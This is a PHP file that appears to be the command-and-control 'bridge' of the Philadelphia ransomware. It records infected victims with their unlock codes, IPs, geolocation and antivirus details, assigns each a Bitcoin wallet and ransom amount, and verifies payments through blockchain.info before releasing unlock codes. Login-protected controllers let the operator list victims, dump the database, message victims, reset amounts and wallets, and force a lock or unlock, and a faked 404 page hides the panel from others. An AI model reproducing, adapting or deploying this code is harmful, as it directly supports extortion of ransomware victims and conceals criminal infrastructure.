<?php
define('USERNAME', 'brotherus');
define('PASSWORD', 'brotherus');
define('FOLDER', './');


error_reporting(0);
@header("Content-type: text/plain; charset=UTF-8");

function myGlobal() {
	if(!is_dir(FOLDER)) {
		mkdir(FOLDER);
	}
	
	if(!file_exists(FOLDER.'config.pdb'))
		file_put_contents(FOLDER.'config.pdb', serialize(
			array(
				'amount' => 0.3,
				'confirmations' => 3,
				'increase' => 1,
				'increase_type' => 'a',
				'tolerance' => 10
			)
		));

	if(!file_exists(FOLDER.'wallets.pdb'))
		file_put_contents(FOLDER.'wallets.pdb', null);
		
	if(!file_exists(FOLDER.'.htaccess'))
		file_put_contents(FOLDER.'.htaccess', "options -indexes\n<Files .pdb>\norder allow,deny\ndeny from all\n</Files>");
}

function VerifyLoginController() {
	requirelogin();
	echo 'ok';
}

function requirelogin() {
	if(@$_REQUEST['u']!=USERNAME OR
	 @$_REQUEST['w']!=md5('ph1l4d3lph14'.PASSWORD.'r41nm4k3r'))
		throw_404();
}

function IndexWireframe() {

}

function IndexController() {
	throw_404();
}

function InsertController() {
	$cfg = unserialize(file_get_contents(FOLDER.'config.pdb'));
	$unlock_code = $_REQUEST['ucd'];
	$osinfo = $_REQUEST['osinfo'];
	$user = $_REQUEST['user'];
	$ip = $_SERVER['REMOTE_ADDR'];
	$country = $_REQUEST['country']; 
	$locale = $_REQUEST['locale']; 
	$av = $_REQUEST['av'];
	$wallet = file(FOLDER.'wallets.pdb');
	$wallet = trim($wallet[rand(0, sizeof($wallet)-1)]);
	$amount = $cfg['amount'];
	$geo = json_decode(@file_get_contents('http://www.geoplugin.net/json.gp?ip='.$ip));
	$id = uniqid();
	$victim = array(
		'id' => $id,
		'unlock_code' => $unlock_code,
		'os_info' => $osinfo,
		'av' => $av,
		'user' => $user,
		'country' => $country,
		'locale' => $locale,
		'geo' => array(
			'lat' => $geo->geoplugin_latitude,
			'lon' => $geo->geoplugin_longitude,
			'country' => $geo->geoplugin_countryCode
		),
		'wallet' => $wallet,
		'amount' => $amount,
		'infected' => time(),
		'paid' => false,
		'unlocked' => false,
		'lastactive' => time(), // ping every 30 min
		'unlocked_when' => 0, // time of unlock verification
		'transaction_code' => null, // saved btc transaction code
		'status' => null
	);
	if(!sizeof($victim)) exit; // out of memory
	file_put_contents(FOLDER."ph_v_data_".$id.".pdb", serialize($victim));
	file_put_contents(FOLDER."ph_v_msg_".$id.".pdb", serialize(array()));
	file_put_contents(FOLDER."ph_v_ip_".$id.".pdb", $ip."\n");
	debug("Added victim $id");
	echo $id.'|'.$wallet.'|'.$amount;
}

function Insertp2pController() {
	$cfg = unserialize(file_get_contents(FOLDER.'config.pdb'));
	$unlock_code = $_REQUEST['ucd'];
	$osinfo = $_REQUEST['osinfo'];
	$user = $_REQUEST['user'];
	$ip = $_SERVER['REMOTE_ADDR'];
	$country = $_REQUEST['country'];
	$locale = $_REQUEST['locale'];
	$av = $_REQUEST['av'];
	$wallet = file(FOLDER.'wallets');
	$wallet = trim($wallet[rand(0, sizeof($wallet)-1)]);
	$amount = $cfg['amount'];
	$geo = json_decode(@file_get_contents('http://www.geoplugin.net/json.gp?ip='.$ip));
	$id = $_REQUEST['id'];
	$victim = array(
		'id' => $id,
		'unlock_code' => $unlock_code,
		'os_info' => $osinfo,
		'av' => $av,
		'user' => $user,
		'country' => $country,
		'locale' => $locale,
		'geo' => array(
			'lat' => $geo->geoplugin_latitude,
			'lon' => $geo->geoplugin_longitude,
			'country' => $geo->geoplugin_countryCode
		),
		'wallet' => $wallet,
		'amount' => $amount,
		'infected' => time(),
		'paid' => false,
		'unlocked' => false,
		'lastactive' => time(), // ping every 30 min
		'unlocked_when' => 0, // time of unlock verification
		'transaction_code' => null, // saved btc transaction code
		'status' => null
	);
	if(!file_exists(FOLDER."ph_p2p_data_".$id.".pdb")) {
		if(!sizeof($victim)) exit; // out of memory
		file_put_contents(FOLDER."ph_p2p_data_".$id.".pdb", serialize($victim));
		file_put_contents(FOLDER."ph_p2p_msg_".$id.".pdb", serialize(array()));
		file_put_contents(FOLDER."ph_p2p_ip_".$id.".pdb", $ip);
		debug("Added P2P victim $id");
		echo $id.'|'.$wallet.'|'.$amount;
	} else {
		debug("P2P victim $id already added");
	}
}

function Enablep2pController() {
	$id = $_REQUEST['id'];
	if(file_exists(FOLDER."ph_p2p_data_".$id) and !file_exists(FOLDER."ph_v_data_".$id.".pdb")) {
		rename(FOLDER."ph_p2p_data_".$id, FOLDER."php_v_data_".$id.".pdb");
		rename(FOLDER."ph_p2p_msg_".$id, FOLDER."php_v_msg_".$id.".pdb");
		rename(FOLDER."ph_p2p_ip_".$id, FOLDER."php_v_ip_".$id.".pdb");
		$victim = unserialize(file_get_contents(FOLDER."php_v_data_".$id.".pdb"));
		$h = fopen(FOLDER."ph_v_msg_".$id.".pdb", "w");
		fwrite($h, serialize(array(
			'changeamount|'.$victim['amount'],
			'changewallet|'.$victim['wallet']
		)));
		fclose($h);
		echo 'ok';
	}
}

function PingController() {
	$id = $_REQUEST['id'];
	if(!file_exists(FOLDER.'ph_v_data_'.$id.".pdb")) die('invalidvictim');
	$victim = unserialize(file_get_contents(FOLDER.'ph_v_data_'.$id.".pdb"));
	$victim['lastactive'] = time();
	$victim['ip'] = $_SERVER['REMOTE_ADDR'];
	
	// status
	if(isset($_REQUEST['s'])) $victim['status'] = strip_tags($_REQUEST['s']);
	
	if(!sizeof($victim)) exit; // out of memory
	$h = fopen(FOLDER.'ph_v_data_'.$id.".pdb", "w");
	fwrite($h, serialize($victim));
	fclose($h);
	
	$ips = file(FOLDER.'ph_v_ip_'.$id.".pdb");
	if(!in_array($_SERVER['REMOTE_ADDR'], $ips)) {
		$h = fopen(FOLDER.'ph_v_ip_'.$id.".pdb", "a+");
		fwrite($h, $_SERVER['REMOTE_ADDR']."\n");
		fclose($h);
	}
	
	// messages
	$messages = unserialize(file_get_contents(FOLDER.'ph_v_msg_'.$id.'.pdb'));
	if(sizeof($messages)) {
		echo implode("<=>", $messages);
		$h = fopen(FOLDER.'ph_v_msg_'.$id.'.pdb', 'w');
		fwrite($h, serialize(array()));
		fclose($h);
	} else {
		echo 'ok';
	}
	
	debug("Ping from $id");
}

function CheckpaymentController() {
	$id = $_REQUEST['id'];
	if(!file_exists(FOLDER.'ph_v_data_'.$id.".pdb")) die('invalidvictim');
	$victim = unserialize(file_get_contents(FOLDER.'ph_v_data_'.$id.".pdb"));
	
	$transaction_code = $_REQUEST['transaction'];
	
	if($victim['unlocked']==true) {
		if(isset($_REQUEST['v'])) {
			if($_REQUEST['v']>=130) {
				debug("Victim $id is already unlocked - new agent version");
				echo md5($victim['unlock_code']).$victim['unlock_code'];
			}
		} else {
			debug("Victim $id is already unlocked - old agent version");
			echo $victim['unlock_code'];
		}
		exit;
	}
	if(check_payment($id, $transaction_code)) {
		$victim['paid'] = true;
		$victim['unlocked'] = true;
		$victim['lastactive'] = time();
		$victim['unlocked_when'] = time();
		$victim['transaction_code'] = $transaction_code;
		if(!sizeof($victim)) exit; // out of memory
		$h = fopen(FOLDER.'ph_v_data_'.$id.".pdb", 'w');
		fwrite($h, serialize($victim));
		fclose($h);
		if(isset($_REQUEST['v'])) {
			if($_REQUEST['v']>=130) {
				debug("Victim $id paid and unlocked - new agent version");
				echo md5($victim['unlock_code']).$victim['unlock_code'];
			}
		} else {
			debug("Victim $id paid and unlocked - old agent version");
			echo $victim['unlock_code'];
		}
	} else {
		echo 'false';
	}
}

function DeletevictimController() {
	$id = $_REQUEST['id'];
	if(!file_exists(FOLDER.'ph_v_data_'.$id.".pdb")) die('invalidvictim');
	$victim = unserialize(file_get_contents(FOLDER.'ph_v_data_'.$id.".pdb"));
	$victim['unlock_code'] = 'deadline';
	if(!sizeof($victim)) exit; // out of memory
	$h = fopen(FOLDER.'ph_v_data_'.$id.".pdb", 'w');
	fwrite($h, serialize($victim));
	fclose($h);
	debug("Victim $id has reached deadline");
}

function ListvictimsController() {
	requirelogin();
	debug("Victims list has been requested by HQ");
	header("Content-type: text/plain");
	$victims = glob(FOLDER.'ph_v_*.pdb');
	foreach($victims as $victim) {
		$victim = unserialize(file_get_contents($victim));
		echo "[".$victim['id']."]\r\n";
		foreach($victim as $key=>$value) {
			$key = str_replace(array("\r", "\n"), null, $key);
			if($key=='geo') {
				echo "lat=".$value['lat']."\r\n";
				echo "lon=".$value['lon']."\r\n";
				echo "country_legacy=".$value['country']."\r\n";
			} else {
				if(is_bool($value)) $value = (int)$value;
				$value = str_replace(array("\r", "\n"), null, $value);
				echo $key."=".(is_array($value) ? end($value) : $value)."\r\n";
			}
		}
	}
}

function GetRawDbController() {
	requirelogin();
	$files = glob(FOLDER."*.pdb");
	$xml = '<?xml version="1.0"?>';
	$xml .= "\n<files>";
	debug("Raw DB requested by HQ");
	foreach($files as $file) {
		$xml .= "\n\t<file name=\"".htmlentities($file)."\">";
		$xml .= "\n\t\t<![CDATA[";
		$xml .= "\n\t\t\t".file_get_contents($file);
		$xml .= "\n\t\t]]>";
		$xml .= "\n\t</file>";
	}
	$xml .= "\n</files>";
	echo $xml;
}

function GetRawFileController() {
	requirelogin();
	debug("Raw bridge file requested by HQ");
	echo file_get_contents(__FILE__);
}

function SendmsgController() {
	requirelogin();
	$id = $_REQUEST['id'];
	if(!file_exists(FOLDER.'ph_v_msg_'.$id.".pdb")) die('invalidvictim');
	$msg = unserialize(file_get_contents(FOLDER.'ph_v_msg_'.$id.".pdb"));
	$msg[] = strip_tags($_REQUEST['msg']);
	$h = fopen(FOLDER.'ph_v_msg_'.$id.".pdb", "w");
	fwrite($h, serialize($msg));
	fclose($h);
	debug("Message $msg sent from HQ to victim $id");
	echo 'ok';
}

function CheckvictimController() {
	requirelogin();
	$id = $_REQUEST['id'];
	echo (file_exists(FOLDER.'ph_v_data_'.$id.".pdb")) ? 'true' : 'false';
}

function GetCfgController() {
	requirelogin();
	$cfg = unserialize(file_get_contents(FOLDER.'config.pdb'));
	debug("Bridge settings requested by HQ");
	echo "[config]\r\n";
	foreach($cfg as $key=>$value)
		echo $key."=".$value."\r\n";
	echo "[wallets]\r\n";
	$wallets = file(FOLDER."wallets.pdb");
	foreach($wallets as $value)
		echo uniqid()."=".$value."\r\n";
}

function SetCfgController() {
	requirelogin();
	debug("Bridge settings are going to change");
	$cfg = unserialize(file_get_contents(FOLDER.'config.pdb'));
	$cfg['amount'] = $_REQUEST['amount'];
	$cfg['tolerance'] = $_REQUEST['tolerance'];
	$h = fopen(FOLDER.'config.pdb', 'w');
	fwrite($h, serialize($cfg));
	fclose($h);
	debug("Bridge settings changed");
	// wallets
	$wallets = explode(",", $_REQUEST['wallets']);
	$wallets = implode("\n", $wallets);
	$h = fopen(FOLDER."wallets.pdb", "w");
	fwrite($h, $wallets);
	fclose($h);
	debug("Wallets modified: ".$_REQUEST['wallets']);
	echo 'ok';
}

function LockvictimController() {
	requirelogin();
	$id = $_REQUEST['id'];
	if(!file_exists(FOLDER.'ph_v_data_'.$id.".pdb")) die('invalidvictim');
	$victim = unserialize(file_get_contents(FOLDER.'ph_v_data_'.$id.".pdb"));
	$victim['unlocked'] = false;
	if(!sizeof($victim)) exit; // out of memory
	$h = fopen(FOLDER.'ph_v_data_'.$id.".pdb", "w");
	fwrite($h, serialize($victim));
	fclose($h);
	debug("Victim $id forcedly locked by HQ");
}

function UnlockvictimController() {
	requirelogin();
	$id = $_REQUEST['id'];
	if(!file_exists(FOLDER.'ph_v_data_'.$id.".pdb")) die('invalidvictim');
	$victim = unserialize(file_get_contents(FOLDER.'ph_v_data_'.$id.".pdb"));
	$victim['unlocked'] = true;
	if(!sizeof($victim)) exit; // out of memory
	$h = fopen(FOLDER.'ph_v_data_'.$id.".pdb", "w");
	fwrite($h, serialize($victim));
	fclose($h);
	debug("Victim $id forcedly unlocked by HQ");
}

function SetamountController() {
	requirelogin();
	$id = $_REQUEST['id'];
	if(!file_exists(FOLDER.'ph_v_data_'.$id.".pdb")) die('invalidvictim');
	$victim = unserialize(file_get_contents(FOLDER.'ph_v_data_'.$id.".pdb"));
	$victim['amount'] = (float)$_REQUEST['amount'];
	if(!sizeof($victim)) exit; // out of memory
	$h = fopen(FOLDER.'ph_v_data_'.$id.".pdb", "w");
	fwrite($h, serialize($victim));
	fclose($h);
	debug("Victim $id amount changed to $_REQUEST[amount]");
	echo 'ok';
}

function check_payment($id, $transaction_code) {
	if(!file_exists(FOLDER.'ph_v_data_'.$id.".pdb")) die('invalidvictim');
	$victim = unserialize(file_get_contents(FOLDER.'ph_v_data_'.$id.".pdb"));
	
	// check if was used in other payment
	$victims = glob(FOLDER.'ph_v_*.pdb');
	foreach($victims as $victim) {
		$victim = unserialize(file_get_contents($victim));
		if($victim['transaction_code']==$transaction_code)
			return die('alreadyused');
	}
	// check payment wallet and value
	$cfg = unserialize(file_get_contents(FOLDER.'config.pdb'));
	$victim = unserialize(file_get_contents(FOLDER.'ph_v_'.$id.'.pdb'));
	$transaction_details = get_transaction_details($transaction_code);
	if(!$transaction_details) return false;
	$wallet = $victim['wallet'];
	$amount = $victim['amount'];
	if(!$wallet) return die('nowallet');
	if(!array_key_exists($wallet, $transaction_details)) return die('wrongwallet');
	$sent = $transaction_details[$wallet];
	$minimal_amount = $amount-($amount*($cfg['tolerance']/100));

	if($sent AND (float)$sent>=(float)$minimal_amount) {
		return true;
	} else {
		die('underminimal');
		return false;
	}
}

function get_transaction_details($code) {
	$request = @file_get_contents('https://blockchain.info/pt/rawtx/'.$code);
	if($request) {
		$json = json_decode($request);
		if($json->double_spend) return false;
		$return = array();
		foreach($json->out as $sub) {
			if(array_key_exists($sub->addr, $return))
				$return[$sub->addr] += btcval_process($sub->value);
			else
				$return[$sub->addr] = btcval_process($sub->value);
		}
		return $return;
	} else {
		return false;
	}
}

function btcval_process($val) {
	return (float)$val/100000000;
}

function throw_404() {
	@header("Content-type: text/html; charset=UTF-8");
	http_response_code(404);
	$fakepath = '/'.uniqid().'/'.uniqid();
	echo str_replace($fakepath, $_SERVER['REQUEST_URI'], file_get_contents(
		(isset($_SERVER["HTTPS"]) ? 'https' : 'http').'://'.$_SERVER['SERVER_NAME'].(in_array($_SERVER['SERVER_PORT'], array(80, 443)) ? '' : ':'.$_SERVER['SERVER_PORT']).$fakepath,
		false,
		stream_context_create(
			array(
				'http' => array(
					'ignore_errors' => true
				)
			)
		)
	));
	exit;
}

function wait_for_file($fp) {
	if ($fp === false) {
		return;
	}
	while (true) {
		if (flock($fp, LOCK_EX)) {
			return;
		}
		$k = rand(0, 20);
		usleep(round($k * 10000));
	}
}

function debug($str) {
	if(!defined('DEBUG')) return;
	$h = fopen("Philadelphia_debug.txt", "a+");
	wait_for_file($h);
	fwrite($h, "\n\n---\n\n[".basename(__FILE__)."][".date("Y-m-d H:i:s")."] ".$_SERVER['REQUEST_URI']."\n".$str."\n\n".var_export($_REQUEST, 1));
	flock($h, LOCK_UN);
	fclose($h);
}

// Configuration starts here
$cfg_defaultwireframe = 'index';              // Default wireframe to use for pages
$cfg_defaultpage = 'index';                   // Default page to load if none specified, this is your frontpage
$cfg_error404 = 'index';                      // View to serve on missing views or illegal pagenames
$cfg_defaulttitle = 'Philadelphia';       // Site title
$cfg_titleseparator = ' - ';                  // Default title separator. If not found, the default
										  // pagetitle will not be merged with the page titles
$cfg_pagetitles = array(                      // Array defining the pagetitle to use for each page.
										  // If none found, the default is used.
'demo1' => 'Demonstration 1',
'error' => 'Error page'
);

// --- Do NOT edit below this line unless you know what you are doing! ---

// Get selected pagename
$p = $cfg_defaultpage;
if (isset($_REQUEST['p']))
if (preg_match('|^[0-9a-zA-Z\/]*\z|',$_REQUEST['p']))
  $p = $_REQUEST['p'];
else
  $p = $cfg_error404;

// Get pagetitle (this is a surprisingly large part of the code!)
if (!isset($cfg_pagetitles[$p]))
$t = $cfg_defaulttitle; // No pagetitle in array, use default
else {
if (!isset($cfg_titleseparator))
  $t = $cfg_pagetitles[$p]; // Pagetitle, but no separator, use pagetitle alone
else
  $t = $cfg_defaulttitle . $cfg_titleseparator . $cfg_pagetitles[$p]; //Pagetitle and separator, use full title
}

$w = $cfg_defaultwireframe; // Set default wireframe

// Import global.php if it exists
if (function_exists('myGlobal'))
myGlobal();

// Run controller if it exists
if (function_exists("{$p}Controller"))
call_user_func($p."Controller");

// Run wireframe
if (!function_exists("{$p}View"))
  $p = $cfg_error404;
if (!function_exists("{$w}Wireframe"))
die("Missing wireframe");
call_user_func($p."Wireframe");
//die('EOF');
exit; ?>
1